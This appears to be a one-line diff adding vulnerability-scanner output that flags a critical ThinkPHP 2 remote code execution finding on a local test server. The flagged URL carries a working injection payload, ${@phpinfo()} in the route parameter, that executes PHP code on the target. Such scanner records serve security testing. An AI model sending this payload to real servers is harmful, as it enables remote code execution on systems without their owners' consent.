@@ -1,0 +1,1 @@
+[thinkphp-2-rce] [http] [critical] http://127.0.0.1:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D
